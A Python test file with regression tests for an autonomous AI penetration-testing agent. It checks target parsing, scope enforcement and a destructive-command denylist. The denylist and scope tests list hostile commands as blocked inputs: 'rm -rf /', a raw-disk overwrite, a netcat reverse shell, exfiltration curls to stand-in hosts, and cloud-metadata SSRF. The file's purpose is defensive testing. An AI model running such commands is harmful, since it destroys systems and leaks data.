"""Regressions for the autonomy + truthfulness fixes.

Each test here pins a behaviour that a real run got wrong, in the order the
problems were found:

1. the fast/bug-bounty bootstrap invented open ports and a subdomain,
2. a `host:port` target lost its port before recon ran,
3. the destructive-command denylist only matched the start of a command line,
4. the scope checker read a User-Agent's version string as a destination and
   refused the agent's own commands against its assigned target,
5. soft gates (self-critique, phase, tool repetition, justification) refused to
   execute the model's chosen command and burned the iteration, which stalled
   runs at zero findings.
"""

import unittest
from pathlib import Path

from config import CONFIG


# ---------------------------------------------------------------------------
# 1 + 2 — no fabricated state, and the port is not dropped
# ---------------------------------------------------------------------------
class TargetParsingTests(unittest.TestCase):
    def _agent_class(self):
        from agent import X19
        return X19

    def test_explicit_port_is_preserved(self):
        X19 = self._agent_class()
        self.assertEqual(X19._split_target("127.0.0.1:8099"), ("127.0.0.1", 8099))
        self.assertEqual(X19._split_target("example.com:8443"), ("example.com", 8443))
        self.assertEqual(X19._split_target("http://example.com/path"), ("example.com", 0))

    def test_origin_keeps_port_and_picks_scheme(self):
        X19 = self._agent_class()
        self.assertEqual(X19._target_origin("127.0.0.1:8099"), "http://127.0.0.1:8099")
        self.assertEqual(X19._target_origin("example.com:8443"), "https://example.com:8443")
        self.assertEqual(X19._target_origin("example.com"), "http://example.com")

    def test_normalize_domain_stays_bare_for_dns_tools(self):
        """subfinder/amass must not be handed a port."""
        X19 = self._agent_class()
        self.assertEqual(X19._normalize_domain("127.0.0.1:8099"), "127.0.0.1")

    def test_ipv6_literal(self):
        X19 = self._agent_class()
        self.assertEqual(X19._split_target("[::1]:8443"), ("::1", 8443))

    def test_dify_source_is_gone_from_module(self):
        """The fabricated seeding was literal source, not a runtime branch."""
        text = (Path(__file__).resolve().parent.parent / "agent.py").read_text(encoding="utf-8")
        self.assertNotIn(
            'for p in (80, 443):\n            self.model.add_port(', text,
            "bootstrap must not seed ports nobody scanned",
        )
        self.assertNotIn(
            'self.model.add_subdomain(f"www.{domain}")', text,
            "bootstrap must not invent a www subdomain",
        )


# ---------------------------------------------------------------------------
# 3 — denylist covers every statement, not just the first
# ---------------------------------------------------------------------------
class DenylistTests(unittest.TestCase):
    def setUp(self):
        from tools import ToolExecutor
        self.ex = ToolExecutor

    def test_chained_destruction_is_blocked(self):
        for cmd in (
            "echo hi; rm -rf /",
            "echo hi; reboot",
            "true && sudo -i",
            "echo x >/dev/sda",
            "X=1 rm -rf /",
            "for f in *; do rm -rf /; done",
            "ls; nc 1.2.3.4 4444 -e /bin/bash",
        ):
            with self.subTest(cmd=cmd):
                self.assertIsNotNone(self.ex._blocked_hit(cmd), f"not blocked: {cmd}")

    def test_ordinary_assessment_commands_are_allowed(self):
        for cmd in (
            "curl -s http://127.0.0.1:8099/ | head -40",
            "nmap -sV -p 8099 127.0.0.1",
            "gobuster dir -u http://x -w /usr/share/wordlists/x.txt -t 30",
            "curl -s 'http://x/a?b=1&c=2' -d 'p=q&r=s'",
            "ffuf -u http://x/FUZZ -w words.txt -mc 200,301",
            "echo 'test' > out.txt && wc -l out.txt",
            "dd if=in.txt of=out.txt bs=1k",
        ):
            with self.subTest(cmd=cmd):
                self.assertIsNone(self.ex._blocked_hit(cmd), f"false positive: {cmd}")


# ---------------------------------------------------------------------------
# 4 — scope sees destinations, not version strings
# ---------------------------------------------------------------------------
class ScopeReferenceTests(unittest.TestCase):
    def setUp(self):
        from execution.policy_engine import PolicyEngine, ExecutionPolicy
        self.pe = PolicyEngine(ExecutionPolicy(allowed_targets={"127.0.0.1:8099"}))

    def _verdict(self, command):
        from execution.command_request import CommandRequest
        return self.pe.evaluate(CommandRequest.from_shell(command, target="127.0.0.1:8099"))

    def test_browser_user_agent_does_not_look_like_a_destination(self):
        ua = ("--user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'")
        v = self._verdict(f"curl -sI {ua} http://127.0.0.1:8099/ | head -30")
        self.assertTrue(v.allowed, f"legitimate command blocked: {v.reason}")

    def test_out_of_scope_still_blocked(self):
        for cmd in (
            "nmap -p- 10.0.0.5",
            "curl -s http://evil-attacker.com/x",
            "nc -e /bin/sh 45.77.1.2 4444",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(self._verdict(cmd).allowed)

    def test_destination_hidden_in_a_query_is_still_checked(self):
        for cmd in (
            "curl -sL http://127.0.0.1:8099/r?to=http://91.99.0.1/x",
            "curl -s 'http://127.0.0.1:8099/f?url=169.254.169.254/latest/meta-data'",
            "curl -s -H 'X-Data: http://evil.io/steal' http://127.0.0.1:8099/",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(self._verdict(cmd).allowed, f"scope missed: {cmd}")


# ---------------------------------------------------------------------------
# 5 — soft gates advise, they do not veto
# ---------------------------------------------------------------------------
class AdvisoryGateTests(unittest.TestCase):
    def _bare_agent(self):
        from agent import X19

        class _StubAI:
            def name(self):
                return "stub"

            def chat(self, system, message):
                return ""

        return X19(ai=_StubAI(), target="127.0.0.1")

    def test_advise_is_advisory_by_default_and_blocking_when_strict(self):
        original = CONFIG.STRICT_GATES
        agent = self._bare_agent()
        try:
            CONFIG.STRICT_GATES = False
            self.assertFalse(agent._advise("some note"),
                             "autonomy mode must not refuse the model's action")
            self.assertIn("some note", agent._advisories)

            CONFIG.STRICT_GATES = True
            self.assertTrue(agent._advise("another"),
                            "X19_STRICT_GATES=1 must restore the old blocking gate")
        finally:
            CONFIG.STRICT_GATES = original

    def test_advisories_are_drained_once(self):
        agent = self._bare_agent()
        agent._advisories = []
        agent._advise("note one")
        agent._advise("note two")
        block = agent._drain_advisories()
        self.assertIn("note one", block)
        self.assertIn("note two", block)
        self.assertEqual(agent._drain_advisories(), "", "advisories must not repeat forever")

    def test_justification_gate_allows_the_first_move_of_a_run(self):
        """Before this, an empty world model meant 'no real session data' and the
        opening recon command was rejected — with nothing discovered yet, there
        is nothing that *could* be cited."""
        agent = self._bare_agent()
        agent.model.ports = []
        agent.model.endpoints = []
        agent.model.subdomains = []
        agent.model.tech_stack = {}
        agent.model.findings = []
        agent.model.credentials = []
        ok, reason = agent._justification_gate("tool:curl, why:baseline", "start here",
                                               "curl -si http://127.0.0.1/")
        self.assertTrue(ok, f"bootstrap move rejected: {reason}")



# ---------------------------------------------------------------------------
# 6 — behaviour must not depend on the entry point
# ---------------------------------------------------------------------------
class EntryPointParityTests(unittest.TestCase):
    def test_agent_constructs_without_runtime_bootstrap(self):
        """`run.py` installs compatibility patches before importing agent.py.

        That meant a module the agent constructs at import time could be broken
        in a way only `run.py` papered over, so `import agent; X19()` failed
        while the CLI worked. X19 must be constructible on its own.
        """
        import sys as _sys

        for name in list(_sys.modules):
            if name == "runtime_bootstrap":
                del _sys.modules[name]
        import runtime_bootstrap  # noqa: F401  (fresh, but nothing imports it here)

        from agent import X19

        class _StubAI:
            def name(self):
                return "stub"

            def chat(self, system, message):
                return ""

        agent = X19(ai=_StubAI(), target="127.0.0.1")
        self.assertIsNotNone(agent.proxy)
        self.assertEqual(agent.proxy.proxy_url(), "http://127.0.0.1:8080")
        # mitm, when running, is the capture proxy regardless of Burp state.
        agent.proxy.mitm_proc = object()
        agent.proxy.burp_proc = object()
        self.assertEqual(agent.proxy.proxy_url(), "http://127.0.0.1:8081")

    def test_proxy_manager_detects_mitmproxy_without_nameerror(self):
        from network import ProxyManager

        pm = ProxyManager()
        self.assertIn(pm.mitm_available, (True, False))


if __name__ == "__main__":
    unittest.main()
